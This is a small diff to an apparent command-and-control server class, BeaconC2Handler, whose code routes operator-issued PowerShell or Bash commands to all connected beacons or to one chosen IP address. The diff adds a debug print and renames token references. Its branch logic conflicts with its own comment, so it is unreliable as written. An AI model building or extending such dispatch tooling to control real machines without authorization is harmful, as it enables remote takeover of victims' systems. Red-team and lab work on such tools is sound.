@@ -83,14 +83,15 @@ public class BeaconC2Handler implements Runnable{
                 String[] tokens = tokensAndCommands[0].split(" ");
                 String verb = tokens[0];
                 String scope = tokens[1];
+                System.out.println(scope);
                 String target = tokens[2];
                 String commands = tokensAndCommands[1];
                 if(tokens[0].equals("quit")){
                     break;
                 }
-                if(tokens[0].equals("Command")){
+                if(verb.equals("Command")){
                     // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address]_[Powershell/Bash command to be run]"
-                    if(tokens[2].equals("All")){
+                    if(target.equals("All")){
                         beaconServer.distributeCommands(tokens[1], commands);
                     } else {
                         beaconServer.distributeCommands(scope, commands);
